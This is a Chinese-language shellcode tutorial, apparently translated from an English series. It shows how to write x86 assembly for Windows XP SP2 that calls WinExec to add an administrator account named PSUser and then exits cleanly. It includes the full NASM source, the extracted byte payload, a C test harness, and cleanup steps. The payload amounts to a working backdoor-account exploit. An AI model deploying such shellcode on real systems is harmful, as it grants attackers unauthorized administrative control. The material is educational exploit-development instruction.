## 简介  ##

这个教程是对第一个教程的简单扩展；然而，现在我们不仅仅是简单的让shellcode睡眠5秒，它会调用WinExec函数在受感染者系统上创建一个管理员用户。本教程也会教你如何定义和定位字符串常量。在这里你要执行的命令字符串。我们会干净利落的退出这个进程所以不会再产生核心转储错误。 

教程的有些部分内容引用自这里 

[http://www.vividmachines.com/shellcode/shellcode.html. ](http://www.vividmachines.com/shellcode/shellcode.html)

## 我们的目标  ##

我们shellcode的目标是定位到命令字符串并通过WinExec执行它，在受感染系统上创建一个管理员用户。注意这个教程会在你系统上创建一个管理员账户，所以记住删掉它要不然你可能由于它被黑。 

## 我们需要什么函数，哪里找到它们?  ##

通过编程经验（或者至少通过Google），我们知道要在windows运行一个命令需要调用WinExec函数，要正确退出一个进程需要调用ExitProcess函数。这些都可以在Kernel32.dll中找到。 

我们会使用arwin（见前面教程）来定位这些函数的地址。可以使用下面的命令： 

    $ ./arwin.exe Kernel32.dll WinExec
    arwin - win32 address resolution program - by steve hanna - v.01
    WinExec is located at 0x7c8615b5 in Kernel32.dll
 

    $ ./arwin.exe Kernel32.dll ExitProcess
     arwin - win32 address resolution program - by steve hanna - v.01
     ExitProcess is located at 0x7c81ca82 in Kernel32.dll 

你得到的地址可能跟我的不同，这取决于系统和版本号。我用的是Windows XP SP2.我们在shellcode中用的是地址的硬编码，所以这意味着它只能在特定系统和版本运行。这也可能因为你安装的补丁而不同。有许多高级技术可以用来动态定位Kernel32.dll和函数地址。但这将在后面章节涉及。 

## 定义和定位字符串常量  ##

下面是我们将在shellcode中定义的字符串常量，我们通过它创建一个用户名为“PSuser”密码是“PSPassword”的用户： 

    'cmd.exe /c net user PSUser PSPasswd /ADD && net localgroup Administrators /ADD PSUser' 

下面的代码片段尾部演示了如何定义字符串常量，前面演示如何定位这个字符串。 

    +--------------- [snip] ---------------+    
    jmp short GetCommand;Jump to where our string is located ("GetCommand" label below)
    CommandReturn:;Create a label we can call to return here.
    pop ebx;the "call" operation below has pushed its return address onto the stack, which we have designed to point to our string - so pop the address of the string off the stack and into ebx.
     ;At this point, ebx points to our string. 
    +--------------- [snip] ---------------+
    GetCommand: ;Create the "GetCommand" label where our string is located
         call CommandReturn ;"call" is like jump, but also pushes the return address (next instruction after call) onto the stack. Since our string is defined immediately after this instruction, the return address points to the address of our string.
         db "cmd.exe /c net user PSUser PSPasswd /ADD && net localgroup Administrators /ADD PSUser" ;Write the raw bytes into the shellcode that represent our string.
         db 0x00 ;Terminate our string with a null character.
	+--------------- [snip] ---------------+ 

## 汇编代码  ##

下面是adduser.asm的代码，原始出处是[http://www.vividmachines.com/shellcode/shellcode.html](http://www.vividmachines.com/shellcode/shellcode.html)，有细微的修改和注释。 

把下面的代码写到你的Cygwin“shellcode directory”中创建的adduser.asm中。一定要阅读代码的注释，他们解释了每行代码的作用，为后面shellcode的开发提供了有用的技巧。记得用上面arwin得到的地址替换掉WinExec和ExitProcess的地址。 

    +----------------- Start adduser.asm -----------------+   
    ;adduser.asm
    [Section .text]
    
    BITS 32
    
    global _start
    
    _start:
    
    jmp short GetCommand ;jump to the location of the command string
    CommandReturn: ;Define a label to call so that string address is pushed onto stack
    pop ebx ;ebx now points to the string
    
    xor eax,eax ;empties out eax
    push eax ;push null onto stack as empty parameter value
    push ebx ;push the command string onto the stack
    mov ebx,0x7c8615b5 ;place address of WinExec into ebx
    call ebx ;call WinExec(path,showcode)
    
    xor eax,eax ;zero the register again to clear WinExec return value (return values are often returned into eax)
    push eax ;push null onto stack as empty parameter value
    mov ebx, 0x7c81ca82 ;place address of ExitProcess into ebx
    call ebx ;call ExitProcess(0);
    
    GetCommand: ;Define label for location of command string
    call CommandReturn ;call the return label so the return address (location of string) is pushed onto stack
    db "cmd.exe /c net user PSUser PSPasswd /ADD && net localgroup Administrators /ADD PSUser" ;Write the raw bytes into the shellcode that represent our string.
    db 0x00 ;Terminate our string with a null character.
    
    +----------------- End adduser.asm -----------------+

## 编译汇编代码 ##
现在我们用汇编代码写好了shellcode，我们需要编译它。可以使用nasm汇编编译器，用下面的命令，adduser.asm是要编译的汇编代码，adduser.bin是编译生成的二进制文件。 

    # nasm -f bin -o adduser.bin adduser.asm

## 得到shellcode  ##

编译得到二进制文件后，我们可以使用xxd工具生成shellcode。用下面的xxd命令，将生成下面的内容： 

    # xxd -i adduser.bin
     unsigned char adduser_bin[] = {
      0xeb, 0x16, 0x5b, 0x31, 0xc0, 0x50, 0x53, 0xbb, 0xb5, 0x15, 0x86, 0x7c,
      0xff, 0xd3, 0x31, 0xc0, 0x50, 0xbb, 0x82, 0xca, 0x81, 0x7c, 0xff, 0xd3,
      0xe8, 0xe5, 0xff, 0xff, 0xff, 0x63, 0x6d, 0x64, 0x2e, 0x65, 0x78, 0x65,
      0x20, 0x2f, 0x63, 0x20, 0x6e, 0x65, 0x74, 0x20, 0x75, 0x73, 0x65, 0x72,
      0x20, 0x50, 0x53, 0x55, 0x73, 0x65, 0x72, 0x20, 0x50, 0x53, 0x50, 0x61,
      0x73, 0x73, 0x77, 0x64, 0x20, 0x2f, 0x41, 0x44, 0x44, 0x20, 0x26, 0x26,
      0x20, 0x6e, 0x65, 0x74, 0x20, 0x6c, 0x6f, 0x63, 0x61, 0x6c, 0x67, 0x72,
      0x6f, 0x75, 0x70, 0x20, 0x41, 0x64, 0x6d, 0x69, 0x6e, 0x69, 0x73, 0x74,
      0x72, 0x61, 0x74, 0x6f, 0x72, 0x73, 0x20, 0x2f, 0x41, 0x44, 0x44, 0x20,
      0x50, 0x53, 0x55, 0x73, 0x65, 0x72, 0x00
     };
     unsigned int adduser_bin_len = 115; 

这里创建了一个可以在c程序中使用的字符数组。输出中的每个十六进制数字（0xXX）代表了shellcode中的一个字节。 

我们将会使用“xxd-shellcode.sh”脚本提取出我们可以直接在“shellcodetest.c”中用的原始shellcode，就像我们在之前的教程中做的，下面是命令： 

    # ./xxd-shellcode.sh adduser.bin
     \xeb\x16\x5b\x31\xc0\x50\x53\xbb\xb5\x15\x86\x7c\xff\xd3\x31\xc0\x50\xbb\x82\xca\x81\x7c\xff\xd3\xe8\xe5\xff\xff\xff\x63\x6d\x64\x2e\x65\x78\x65\x20\x2f\x63\x20\x6e\x65\x74\x20\x75\x73\x65\x72\x20\x50\x53\x55\x73\x65\x72\x20\x50\x53\x50\x61\x73\x73\x77\x64\x20\x2f\x41\x44\x44\x20\x26\x26\x20\x6e\x65\x74\x20\x6c\x6f\x63\x61\x6c\x67\x72\x6f\x75\x70\x20\x41\x64\x6d\x69\x6e\x69\x73\x74\x72\x61\x74\x6f\x72\x73\x20\x2f\x41\x44\x44\x20\x50\x53\x55\x73\x65\x72\x00 

## 测试shellcode  ##

我们将使用“shellcodetest.c”程序来测试我们的shellcode。这一步的目的是把shellcode插入到一个C程序，接下来我们会编译执行它。这个程序被设计用来执行shellcode。 

在我们做这之前你需要把上一步生成的shellcode插入到程序中。把它放在“code[]”数组的引号中间。它需要像下面这样结束： 

    +----------------- Start updated shellcodetest.c -----------------+ 
    
    /*shellcodetest.c*/
     char code[] = "\xeb\x16\x5b\x31\xc0\x50\x53\xbb\xb5\x15\x86\x7c\xff\xd3\x31\xc0\x50\xbb\x82\xca\x81\x7c\xff\xd3\xe8\xe5\xff\xff\xff\x63\x6d\x64\x2e\x65\x78\x65\x20\x2f\x63\x20\x6e\x65\x74\x20\x75\x73\x65\x72\x20\x50\x53\x55\x73\x65\x72\x20\x50\x53\x50\x61\x73\x73\x77\x64\x20\x2f\x41\x44\x44\x20\x26\x26\x20\x6e\x65\x74\x20\x6c\x6f\x63\x61\x6c\x67\x72\x6f\x75\x70\x20\x41\x64\x6d\x69\x6e\x69\x73\x74\x72\x61\x74\x6f\x72\x73\x20\x2f\x41\x44\x44\x20\x50\x53\x55\x73\x65\x72\x00";
     int main(int argc, char **argv)
     {
     int (*func)();
     func = (int (*)()) code;
     (int)(*func)();
     } 
    
    +----------------- End updated shellcodetest.c -----------------+ 
现在需要编译更新后的“shellcodetest.c”文件使它执行我们的shellcode。用下面的命令： 

    # gcc -o shellcodetest shellcodetest.c 

创建了可执行文件“shellcodetest.exe”。 

在开始运行这个程序前，我们通过运行下面的命令看一下你系统上的帐户： 

    # net user
    (列出你系统上的帐户) 

现在你要通过测试程序执行你的shellcode。这个shellcode可以在你系统上添加一个用户名为“PSUser”的管理员用户，接着他会安静的退出。 

    # ./shellcodetest.exe
     The command completed successfully.
     (adds a user account)
     The command completed successfully.
     (adds the user account to the administrators group)
     (then exists cleanly) 

我们现在可以再次执行“net user”命令查看帐户是否已经被创建，像下面的一样： 

    # net user
    (列出本地帐户, 现在包含了"PSUser") 

## 清理工作  ##

确保从你的系统中清除掉这个帐户，以防你可能通过它被入侵。可以使用下面的命令： 

    # net user PSUser /delete
     The command completed successfully.
     (deletes the "PSUser" account) 

## 祝贺!  ##

你已经创建了自己的shellcode代码片断，它定义和定位了一个字符串常量，使用它在windows系统上执行一条命令创建了一个管理员帐户。 

现在让我们开始一些复杂的东西！ 
